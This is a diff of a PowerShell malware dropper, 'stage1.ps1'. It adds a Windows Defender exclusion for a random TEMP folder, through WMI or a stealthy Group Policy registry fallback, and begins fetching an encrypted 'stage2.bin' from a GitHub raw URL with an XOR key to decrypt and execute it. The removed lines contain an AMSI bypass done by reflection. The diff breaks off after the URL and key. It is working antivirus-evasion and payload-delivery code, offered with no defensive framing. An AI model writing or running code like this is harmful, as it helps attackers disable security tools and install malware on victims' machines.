@@ -1,29 +1,21 @@
-# stage1.ps1 — AMSI patch + Defender exclusion + stage2 drop
+# stage1.ps1 - Defender Exclusion + Stage2 Drop (Run AFTER patch.ps1)
 
-# ---------- 1. AMSI patch ----------
-try {
-    $t = [Ref].Assembly.GetType(('System.Management.Automation.' + 'AmsiUtils'))
-    $f = $t.GetField(('amsi' + 'InitFailed'), 'NonPublic,Static')
-    $f.SetValue($null, $true)
-} catch {}
-
-# ---------- 2. Defender exclusion via WMI CIM (no PowerShell child) ----------
+# ---------- 1. Add Defender Exclusion via WMI (MSFT_MpPreference) ----------
 $excludeDir = "$env:TEMP\WinCache_" + [System.IO.Path]::GetRandomFileName().Substring(0,8)
 New-Item -ItemType Directory -Path $excludeDir -Force | Out-Null
 
 try {
-    $mp = Get-CimInstance -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -ErrorAction Stop
-    $mp | Invoke-CimMethod -MethodName Add -Arguments @{
+    Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Add -Arguments @{
         ExclusionPath = @($excludeDir)
     } -ErrorAction Stop | Out-Null
 } catch {
-    # fallback: Group Policy registry key (survives reboot, hidden from normal checks)
+    # Fallback: Group Policy registry key (more stealthy)
     $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
     if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
     New-ItemProperty -Path $regPath -Name $excludeDir -Value 0 -PropertyType DWord -Force | Out-Null
 }
 
-# ---------- 3. Download stage2 into the excluded folder ----------
+# ---------- 2. Download, Decrypt, and Execute Stage2 ----------
 $url = "https://raw.githubusercontent.com/beamer123q-svg/update-test/main/stage2.bin"
 $key = [byte[]](0x5A,0x5B,0x5C,0x5D)
 
